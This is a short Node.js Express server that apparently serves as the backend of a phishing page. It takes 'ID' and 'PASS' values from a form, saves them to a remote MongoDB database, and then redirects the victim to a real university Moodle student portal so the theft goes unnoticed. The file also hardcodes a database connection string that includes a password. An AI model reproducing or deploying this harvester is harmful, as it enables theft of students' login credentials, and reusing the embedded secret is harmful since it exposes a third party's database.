const express = require('express');
const app = express();
const port = 3000;
const bodyParser = require('body-parser')
const mongoose = require('mongoose');
const User = require('./user');
const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/?retryWrites=true&w=majority'




app.use(bodyParser.urlencoded({ extended: true }));
app.get('/', (req, res) => {
    res.send('working')
})
app.post('/', (req, res) => {

    mongoose.connect(dbURI)
        .then((result) => {

            let ID = req.body.ID
            let PASS = req.body.PASS
            if (ID == undefined) {
                ID = 'null'
            }
            if (PASS == undefined) {
                PASS = 'null'
            }
            const user = new User({
                ID: ID,
                PASS: PASS
            })
            user.save();
        });
    res.redirect("http://moodle.smuc.edu.et/students/")
})

app.listen(port, () => {
    console.log(`running on ${port}`)
})
module.exports = app;